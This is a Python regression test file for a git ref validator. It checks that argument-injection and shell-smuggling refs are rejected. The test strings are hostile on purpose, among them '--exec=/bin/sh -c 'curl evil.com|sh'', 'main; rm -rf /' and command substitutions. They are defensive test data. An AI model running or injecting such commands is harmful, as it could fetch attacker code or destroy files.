"""Regression tests for sandbox/worktree_manager.py.

Covers bug #15 (HIGH): `ref` was passed unvalidated to
`git rev-parse <ref>` and `git worktree add --detach <dest> <ref>`. A
malicious ref like `--upload-pack=evil` could trigger argument
confusion in older git versions; we now validate the ref against a
strict charset and pass `--` to terminate option parsing.
"""

from __future__ import annotations

import sys
from pathlib import Path

import pytest

_BACKEND_ROOT = Path(__file__).resolve().parent.parent
if str(_BACKEND_ROOT) not in sys.path:
    sys.path.insert(0, str(_BACKEND_ROOT))

from sandbox.worktree_manager import _validate_ref  # noqa: E402

# ─────────────────────────────────────────────────────────────────────
# _validate_ref unit tests
# ─────────────────────────────────────────────────────────────────────


class TestValidateRef:
    def test_head_accepted(self) -> None:
        assert _validate_ref("HEAD") == "HEAD"

    def test_branch_name_accepted(self) -> None:
        assert _validate_ref("main") == "main"
        assert _validate_ref("develop") == "develop"

    def test_namespaced_branch_accepted(self) -> None:
        assert _validate_ref("feature/foo") == "feature/foo"
        assert _validate_ref("release/2.4.0") == "release/2.4.0"

    def test_sha_accepted(self) -> None:
        assert _validate_ref("a3f5b91c") == "a3f5b91c"

    def test_tag_with_dots_accepted(self) -> None:
        assert _validate_ref("v1.2.3") == "v1.2.3"

    def test_caret_tilde_accepted(self) -> None:
        # `HEAD^`, `HEAD~3` are common ref expressions.
        assert _validate_ref("HEAD^") == "HEAD^"
        assert _validate_ref("HEAD~3") == "HEAD~3"

    def test_ref_starting_with_dash_rejected(self) -> None:
        # `--upload-pack=evil` and friends — the original argument-injection
        # vector.
        with pytest.raises(ValueError):
            _validate_ref("--upload-pack=evil-cmd")

    def test_dash_only_rejected(self) -> None:
        with pytest.raises(ValueError):
            _validate_ref("-rf")

    def test_double_dash_alone_rejected(self) -> None:
        with pytest.raises(ValueError):
            _validate_ref("--")

    def test_exec_flag_rejected(self) -> None:
        # The agent-flagged scenario.
        with pytest.raises(ValueError):
            _validate_ref("--exec=/bin/sh -c 'curl evil.com|sh'")

    def test_shell_metacharacters_rejected(self) -> None:
        # Even though subprocess is invoked without shell=True, a ref with
        # metacharacters is suspicious; reject defensively.
        for bad in (
            "main; rm -rf /",
            "main && evil",
            "main$(curl evil)",
            "main`whoami`",
            "main|cat",
            "main\nrm",
        ):
            with pytest.raises(ValueError):
                _validate_ref(bad)

    def test_empty_rejected(self) -> None:
        with pytest.raises(ValueError):
            _validate_ref("")

    def test_whitespace_only_rejected(self) -> None:
        with pytest.raises(ValueError):
            _validate_ref(" ")

    def test_null_byte_rejected(self) -> None:
        with pytest.raises(ValueError):
            _validate_ref("main\0evil")
